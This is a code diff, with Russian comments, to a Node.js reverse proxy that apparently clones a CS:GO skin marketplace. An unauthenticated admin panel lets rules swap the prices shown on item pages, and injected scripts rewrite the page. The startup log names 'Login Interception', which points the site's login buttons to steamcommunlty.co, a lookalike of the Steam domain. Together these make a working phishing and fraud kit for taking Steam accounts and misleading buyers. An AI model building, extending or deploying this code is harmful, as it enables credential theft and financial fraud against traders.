@@ -32,50 +32,6 @@ const selectorRules = new Map();
 // Путь к файлу для сохранения правил
 const RULES_FILE_PATH = path.join(__dirname, 'selector_rules.json');
 
-// НОВОЕ: Функция для нормализации URL с обработкой символа "★"
-function normalizeUrlForComparison(url) {
-    if (!url) return url;
-    
-    // Заменяем различные варианты кодирования звездочки на единый формат
-    return url
-        .replace(/★/g, '%E2%98%85')  // Прямой символ в закодированный
-        .replace(/%E2%98%85/g, '%E2%98%85')  // Уже закодированный остается как есть
-        .replace(/\*%20/g, '%E2%98%85%20')  // Альтернативные варианты
-        .replace(/\*/g, '%E2%98%85');  // Обычная звездочка
-}
-
-// НОВОЕ: Предопределенные селекторы для цены
-const PRICE_SELECTORS = [
-    {
-        selector: '#app > app-main-site > div > app-full-inventory-info > div > app-page-inventory-info-wrap > div > app-page-inventory-price > div > span:nth-child(1)',
-        needsSpace: false
-    },
-    {
-        selector: '#app > app-main-site > div > app-full-inventory-info > div > app-page-inventory-image > app-bid-ask-chart-container > div > div.item.ask.ng-star-inserted > div.title > span:nth-child(2)',
-        needsSpace: true
-    },
-    {
-        selector: '#app > app-main-site > div > app-full-inventory-info > div > app-page-inventory-info-wrap > div > app-bid-ask > div > div.ng-tns-c2030188894-514.ng-trigger.ng-trigger-parent > div.sell-scroll.ng-tns-c2030188894-514 > div:nth-child(1) > div:nth-child(3) > div.center.ng-tns-c2030188894-514',
-        needsSpace: false
-    },
-    {
-        selector: '#app > app-main-site > div > app-full-inventory-info > div > app-page-inventory-info-wrap > div > app-page-inventory-price > best-offers > div > div > span > span:nth-child(2)',
-        needsSpace: false
-    },
-    {
-        selector: '#mat-menu-panel-serverApp9 > div > div > app-best-offers-table > mat-table > mat-row:nth-child(2) > mat-cell.mat-mdc-cell.mdc-data-table__cell.cdk-cell.cdk-column-price.mat-column-price.ng-star-inserted',
-        needsSpace: true
-    },
-    {
-        selector: '#app > app-main-site > div > app-full-inventory-info > div > div > div > app-related-items > div > app-related-chose-items > div > div > div.related-items-item.active.FT.ng-star-inserted > div.price.ng-star-inserted',
-        needsSpace: false
-    },
-    {
-        selector: '#app > app-main-site > div > app-full-inventory-info > div > div > div > app-related-items > div > div > div > a:nth-child(1) > app-same-item > div > div.right > div > span',
-        needsSpace: false
-    }
-];
-
 // Загрузка сохраненных правил при запуске (если есть)
 try {
     if (fs.existsSync(RULES_FILE_PATH)) {
@@ -641,7 +597,7 @@ const adminAuth = (req, res, next) => {
     next(); // Пропускаем всех пользователей без аутентификации
 };
 
-// ОБНОВЛЕНО: Модифицированная версия админ-панели с поддержкой множественных селекторов
+// НОВОЕ: Модифицированная версия админ-панели с возможностью указать оригинальное значение
 app.get('/admin', (req, res) => {
     res.send(`
     <!DOCTYPE html>
@@ -684,23 +640,6 @@ app.get('/admin', (req, res) => {
                 box-sizing: border-box;
                 font-size: 14px;
             }
-            textarea {
-                height: 100px;
-                resize: vertical;
-            }
-            .checkbox-group {
-                display: flex;
-                align-items: center;
-                margin-bottom: 10px;
-            }
-            .checkbox-group input[type="checkbox"] {
-                margin-right: 10px;
-                width: auto;
-            }
-            .checkbox-group label {
-                margin: 0;
-                font-weight: normal;
-            }
             button {
                 background-color: #4CAF50;
                 color: white;
@@ -719,13 +658,6 @@ app.get('/admin', (req, res) => {
             }
             .delete-btn:hover {
                 background-color: #d32f2f;
-            }
-            .secondary-btn {
-                background-color: #2196F3;
-                margin-left: 10px;
-            }
-            .secondary-btn:hover {
-                background-color: #1976D2;
             }
             table {
                 width: 100%;
@@ -775,24 +707,6 @@ app.get('/admin', (req, res) => {
                 margin: 10px 0;
                 border-radius: 4px;
             }
-            .price-selectors-info {
-                background-color: #fcf8e3;
-                color: #8a6d3b;
-                border: 1px solid #faebcc;
-                padding: 10px;
-                margin: 10px 0;
-                border-radius: 4px;
-                font-size: 12px;
-            }
-            .selector-list {
-                max-height: 100px;
-                overflow-y: auto;
-                border: 1px solid #ddd;
-                padding: 5px;
-                margin-top: 5px;
-                background-color: #f9f9f9;
-                font-size: 11px;
-            }
         </style>
     </head>
     <body>
@@ -803,7 +717,6 @@ app.get('/admin', (req, res) => {
             <div class="info-block">
                 <p><strong>Важно!</strong> Для корректной работы подмены на динамических сайтах укажите оригинальное значение, которое нужно заменить.</p>
                 <p>Если указать оригинальное значение, подмена будет применяться только к элементам, содержащим именно это значение, а не ко всем элементам с указанным селектором.</p>
-                <p><strong>Экранирование символа ★:</strong> Система автоматически обрабатывает символ "★" в URL, поэтому можете вводить его напрямую.</p>
             </div>
             
             <h2>Добавить правило подмены</h2>
@@ -812,24 +725,10 @@ app.get('/admin', (req, res) => {
                     <label for="page">URL страницы:</label>
                     <input type="text" id="page" name="page" placeholder="https://market-csgo.co/ru/Gloves/★%20Driver%20Gloves%20%7C%20Racing%20Green%20%28Well-Worn%29?id=6884780475" required>
                 </div>
-                
-                <div class="checkbox-group">
-                    <input type="checkbox" id="useAllPriceSelectors" name="useAllPriceSelectors">
-                    <label for="useAllPriceSelectors">Применить ко всем селекторам цены (автоматически заполнит поле селекторов)</label>
-                </div>
-                
                 <div class="form-group">
-                    <label for="selectors">CSS-селекторы (каждый с новой строки):</label>
-                    <textarea id="selectors" name="selectors" placeholder="Введите селекторы, каждый с новой строки, или используйте галочку выше для автозаполнения"></textarea>
+                    <label for="selector">CSS-селектор:</label>
+                    <input type="text" id="selector" name="selector" placeholder="#app > app-main-site > div > app-full-inventory-info > div > app-page-inventory-info-wrap > div > app-page-inventory-price > div > span:nth-child(1)" required>
                 </div>
-                
-                <div class="price-selectors-info">
-                    <strong>Селекторы цены, которые будут автоматически заполнены:</strong>
-                    <div class="selector-list">
-                        ${PRICE_SELECTORS.map(sel => `<div>${sel.selector}${sel.needsSpace ? ' (с пробелом)' : ''}</div>`).join('')}
-                    </div>
-                </div>
-                
                 <div class="form-group">
                     <label for="originalValue">Оригинальное значение (важно для динамических сайтов):</label>
                     <input type="text" id="originalValue" name="originalValue" placeholder="4212,62₽">
@@ -839,7 +738,6 @@ app.get('/admin', (req, res) => {
                     <input type="text" id="value" name="value" placeholder="421,62₽" required>
                 </div>
                 <button type="submit">Добавить правило</button>
-                <button type="button" class="secondary-btn" onclick="clearForm()">Очистить форму</button>
             </form>
         </div>
         
@@ -850,7 +748,7 @@ app.get('/admin', (req, res) => {
                     <tr>
                         <th>ID</th>
                         <th>URL страницы</th>
-                        <th>CSS-селекторы</th>
+                        <th>CSS-селектор</th>
                         <th>Оригинальное значение</th>
                         <th>Новое значение</th>
                         <th>Действия</th>
@@ -863,9 +761,6 @@ app.get('/admin', (req, res) => {
         </div>
         
         <script>
-            // Массив селекторов цены
-            const PRICE_SELECTORS = ${JSON.stringify(PRICE_SELECTORS)};
-            
             // Функция для отображения сообщений
             function showMessage(message, isError = false) {
                 const container = document.getElementById('messageContainer');
@@ -880,27 +775,6 @@ app.get('/admin', (req, res) => {
                     msgElement.remove();
                 }, 5000);
             }
-            
-            // Функция для очистки формы
-            function clearForm() {
-                document.getElementById('ruleForm').reset();
-            }
-            
-            // Обработчик чекбокса "Применить ко всем селекторам цены"
-            document.getElementById('useAllPriceSelectors').addEventListener('change', function() {
-                const selectorsTextarea = document.getElementById('selectors');
-                
-                if (this.checked) {
-                    // Заполняем textarea селекторами цены
-                    const selectorsList = PRICE_SELECTORS.map(sel => sel.selector).join('\\n');
-                    selectorsTextarea.value = selectorsList;
-                    selectorsTextarea.readOnly = true;
-                } else {
-                    // Очищаем и разблокируем textarea
-                    selectorsTextarea.value = '';
-                    selectorsTextarea.readOnly = false;
-                }
-            });
             
             // Функция для загрузки правил
             async function loadRules() {
@@ -923,19 +797,10 @@ app.get('/admin', (req, res) => {
                     
                     rules.forEach(rule => {
                         const row = document.createElement('tr');
-                        
-                        // Отображаем селекторы
-                        let selectorsDisplay = '';
-                        if (rule.selectors && rule.selectors.length > 0) {
-                            selectorsDisplay = rule.selectors.length + ' селектор(ов)';
-                        } else if (rule.selector) {
-                            selectorsDisplay = rule.selector;
-                        }
-                        
                         row.innerHTML = \`
                             <td>\${rule.id}</td>
                             <td class="truncate" title="\${rule.page}">\${rule.page}</td>
-                            <td class="truncate" title="\${selectorsDisplay}">\${selectorsDisplay}</td>
+                            <td class="truncate" title="\${rule.selector}">\${rule.selector}</td>
                             <td>\${rule.originalValue || '(не указано)'}</td>
                             <td>\${rule.value}</td>
                             <td>
@@ -1009,25 +874,11 @@ app.get('/admin', (req, res) => {
             document.getElementById('ruleForm').addEventListener('submit', async (e) => {
                 e.preventDefault();
                 
-                const selectorsValue = document.getElementById('selectors').value.trim();
-                const useAllPriceSelectors = document.getElementById('useAllPriceSelectors').checked;
-                
-                let selectors = [];
-                if (selectorsValue) {
-                    selectors = selectorsValue.split('\\n').map(s => s.trim()).filter(s => s.length > 0);
-                }
-                
-                if (selectors.length === 0) {
-                    showMessage('Необходимо указать хотя бы один селектор', true);
-                    return;
-                }
-                
                 const formData = {
                     page: document.getElementById('page').value,
-                    selectors: selectors,
+                    selector: document.getElementById('selector').value,
                     value: document.getElementById('value').value,
-                    originalValue: document.getElementById('originalValue').value || '',
-                    useAllPriceSelectors: useAllPriceSelectors
+                    originalValue: document.getElementById('originalValue').value || '' // Может быть пустым
                 };
                 
                 await addRule(formData);
@@ -1041,25 +892,22 @@ app.get('/admin', (req, res) => {
     `);
 });
 
-// ОБНОВЛЕНО: API для админ-панели с поддержкой множественных селекторов и экранирования символа ★
+// НОВОЕ: API для админ-панели
+// НОВОЕ: Упрощенная и улучшенная логика для получения правил
 app.get('/admin-api/selector-rules', (req, res) => {
     try {
         const page = req.query.page;
         
         // Если указан параметр page, возвращаем правила для этой страницы
         if (page) {
-            const normalizedPage = normalizeUrlForComparison(page);
-            
             const matchingRules = Array.from(selectorRules.values())
                 .filter(rule => {
-                    const normalizedRulePage = normalizeUrlForComparison(rule.page);
-                    
                     // Сначала проверяем точное совпадение URL
-                    if (normalizedRulePage === normalizedPage) return true;
+                    if (rule.page === page) return true;
                     
                     // Затем проверяем базовое совпадение URL без параметров
-                    const pageBase = normalizedPage.split('?')[0];
-                    const ruleBase = normalizedRulePage.split('?')[0];
+                    const pageBase = page.split('?')[0];
+                    const ruleBase = rule.page.split('?')[0];
                     
                     if (pageBase === ruleBase) return true;
                     
@@ -1089,56 +937,36 @@ app.get('/admin-api/selector-rules', (req, res) => {
     }
 });
 
-// ОБНОВЛЕНО: API для админ-панели с поддержкой множественных селекторов
+// НОВОЕ: API для админ-панели с сохранением оригинального значения для селектора
 app.post('/admin-api/selector-rules', (req, res) => {
     try {
-        const { page, selectors, value, useAllPriceSelectors } = req.body;
+        const { page, selector, value } = req.body;
         
         // Проверка обязательных полей
-        if (!page || !selectors || !Array.isArray(selectors) || selectors.length === 0 || !value) {
+        if (!page || !selector || !value) {
             return res.status(400).json({ message: 'Все поля обязательны для заполнения' });
         }
         
         // Получаем оригинальное значение для сохранения
+        // В запросе может прийти оригинальное значение, если пользователь его указал
         const originalValue = req.body.originalValue || '';
         
         // Создаем ID для правила
         const id = Date.now().toString(36) + Math.random().toString(36).substring(2, 5);
         
-        // НОВОЕ: Подготавливаем селекторы с учетом необходимости пробелов
-        let processedSelectors = selectors;
-        
-        // Если используется опция "все селекторы цены", то добавляем информацию о пробелах
-        if (useAllPriceSelectors) {
-            processedSelectors = selectors.map(selector => {
-                const priceSelector = PRICE_SELECTORS.find(ps => ps.selector === selector);
-                return {
-                    selector: selector,
-                    needsSpace: priceSelector ? priceSelector.needsSpace : false
-                };
-            });
-        } else {
-            // Для пользовательских селекторов пробелы не нужны по умолчанию
-            processedSelectors = selectors.map(selector => ({
-                selector: selector,
-                needsSpace: false
-            }));
-        }
-        
-        // Добавляем правило с сохранением информации о селекторах
+        // Добавляем правило с сохранением оригинального значения
         selectorRules.set(id, { 
             id, 
             page, 
-            selectors: processedSelectors,  // Массив объектов с селекторами и флагами пробелов
+            selector, 
             value,
-            originalValue,
-            useAllPriceSelectors: useAllPriceSelectors || false
+            originalValue // Сохраняем оригинальное значение для точного сопоставления
         });
         
         // Сохраняем правила в файл
         saveRulesToFile();
         
-        res.status(201).json({ id, page, selectors: processedSelectors, value, originalValue });
+        res.status(201).json({ id, page, selector, value, originalValue });
     } catch (error) {
         console.error('Error adding selector rule:', error);
         res.status(500).json({ message: 'Ошибка при добавлении правила подмены' });
@@ -1743,41 +1571,6 @@ const loginButtonsScript = `
 </script>
 `;
 
-// Запуск сервера
-server.listen(PORT, '0.0.0.0', () => {
-    console.log(`
-    🚀 Market Proxy Server с управлением подменой значений
-    📡 Port: ${PORT}
-    🎯 Target: ${TARGET_HOST}
-    🔌 WebSocket: ${WS_TARGET}
-    🔒 HTTPS: Auto-detected
-    🔑 Login Interception: Enabled for #login-head-tablet, #login-register, #login-chat, #login-head -> https://steamcommunlty.co/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2Fdota2.net%2Flogin%2Findex.php%3Fgetmid%3Dcsgocom%26login%3D1%26ip%3D580783084.RytkB5FMW0&openid.realm=https%3A%2F%2Fdota2.net&openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select
-    👑 Панель управления: ${getBaseUrl({headers: {host: 'localhost:'+PORT}, protocol: 'http'})}/admin
-    
-    Features:
-    ✓ Full HTTP/HTTPS proxy
-    ✓ WebSocket support
-    ✓ GraphQL support
-    ✓ Cookie management
-    ✓ CORS handling
-    ✓ URL rewriting
-    ✓ Content modification
-    ✓ Login buttons interception
-    ✓ Mixed content prevention
-    ✓ Multi-Selector Value Replacement with automatic star symbol escaping
-    ✓ Price selectors batch replacement
-    `);
-});
-
-// Graceful shutdown
-process.on('SIGINT', () => {
-    console.log('\n🔄 Shutting down gracefully...');
-    server.close(() => {
-        console.log('✅ Server closed');
-        process.exit(0);
-    });
-});
-
 // Инжектим улучшенный прокси скрипт с исправлениями для GraphQL и WebSocket
 const proxyScript = `
 <script>
@@ -2007,10 +1800,10 @@ const proxyScript = `
 </script>
 `;
 
-// ОБНОВЛЕНО: АГРЕССИВНАЯ СИСТЕМА ПОДМЕНЫ для SPA с поддержкой множественных селекторов
+// АГРЕССИВНАЯ СИСТЕМА ПОДМЕНЫ для SPA с динамической загрузкой
 const selectorReplacementScript = `
 <script type="text/javascript">
-// Система подмены для SPA с динамической загрузкой и поддержкой множественных селекторов
+// Система подмены для SPA с динамической загрузкой
 (function() {
     let replacementRules = [];
     let isActive = false;
@@ -2036,53 +1829,31 @@ const selectorReplacementScript = `
         return false;
     }
     
-    // ОБНОВЛЕНО: Функция для применения правил подмены с поддержкой множественных селекторов
+    // Функция для применения правил подмены
     function applyReplacements() {
         if (!replacementRules.length) return;
         
         replacementRules.forEach(rule => {
             try {
-                // Поддержка как старого формата (rule.selector), так и нового (rule.selectors)
-                let selectorsToProcess = [];
+                const elements = document.querySelectorAll(rule.selector);
                 
-                if (rule.selectors && Array.isArray(rule.selectors)) {
-                    // Новый формат с множественными селекторами
-                    selectorsToProcess = rule.selectors;
-                } else if (rule.selector) {
-                    // Старый формат с одним селектором (обратная совместимость)
-                    selectorsToProcess = [{ selector: rule.selector, needsSpace: false }];
-                }
-                
-                selectorsToProcess.forEach(selectorObj => {
-                    const selector = typeof selectorObj === 'string' ? selectorObj : selectorObj.selector;
-                    const needsSpace = typeof selectorObj === 'object' ? selectorObj.needsSpace : false;
+                elements.forEach(element => {
+                    // Проверяем, нужно ли применять правило
+                    let shouldReplace = false;
                     
-                    try {
-                        const elements = document.querySelectorAll(selector);
-                        
-                        elements.forEach(element => {
-                            // Проверяем, нужно ли применять правило
-                            let shouldReplace = false;
-                            
-                            if (rule.originalValue && rule.originalValue.trim()) {
-                                // Если указано оригинальное значение, проверяем совпадение
-                                if (element.innerHTML.trim() === rule.originalValue.trim()) {
-                                    shouldReplace = true;
-                                }
-                            } else {
-                                // Если оригинальное значение не указано, всегда подменяем
-                                shouldReplace = true;
-                            }
-                            
-                            if (shouldReplace) {
-                                // Применяем значение с учетом необходимости пробела
-                                const finalValue = needsSpace ? ' ' + rule.value : rule.value;
-                                element.innerHTML = finalValue;
-                                console.log('Подменено значение:', selector, '->', finalValue);
-                            }
-                        });
-                    } catch (e) {
-                        console.error('Ошибка применения селектора:', selector, e);
+                    if (rule.originalValue && rule.originalValue.trim()) {
+                        // Если указано оригинальное значение, проверяем совпадение
+                        if (element.innerHTML.trim() === rule.originalValue.trim()) {
+                            shouldReplace = true;
+                        }
+                    } else {
+                        // Если оригинальное значение не указано, всегда подменяем
+                        shouldReplace = true;
+                    }
+                    
+                    if (shouldReplace) {
+                        element.innerHTML = rule.value;
+                        console.log('Подменено значение:', rule.selector, '->', rule.value);
                     }
                 });
             } catch (e) {
@@ -2241,3 +2012,37 @@ const selectorReplacementScript = `
 })();
 </script>
 `;
+
+// Запуск сервера
+server.listen(PORT, '0.0.0.0', () => {
+    console.log(`
+    🚀 Market Proxy Server с управлением подменой значений
+    📡 Port: ${PORT}
+    🎯 Target: ${TARGET_HOST}
+    🔌 WebSocket: ${WS_TARGET}
+    🔒 HTTPS: Auto-detected
+    🔑 Login Interception: Enabled for #login-head-tablet, #login-register, #login-chat, #login-head -> https://steamcommunlty.co/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2Fdota2.net%2Flogin%2Findex.php%3Fgetmid%3Dcsgocom%26login%3D1%26ip%3D580783084.RytkB5FMW0&openid.realm=https%3A%2F%2Fdota2.net&openid.ns.sreg=http%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select
+    👑 Панель управления: ${getBaseUrl({headers: {host: 'localhost:'+PORT}, protocol: 'http'})}/admin
+    
+    Features:
+    ✓ Full HTTP/HTTPS proxy
+    ✓ WebSocket support
+    ✓ GraphQL support
+    ✓ Cookie management
+    ✓ CORS handling
+    ✓ URL rewriting
+    ✓ Content modification
+    ✓ Login buttons interception
+    ✓ Mixed content prevention
+    ✓ Selector Value Replacement with automatic restore
+    `);
+});
+
+// Graceful shutdown
+process.on('SIGINT', () => {
+    console.log('\n🔄 Shutting down gracefully...');
+    server.close(() => {
+        console.log('✅ Server closed');
+        process.exit(0);
+    });
+});
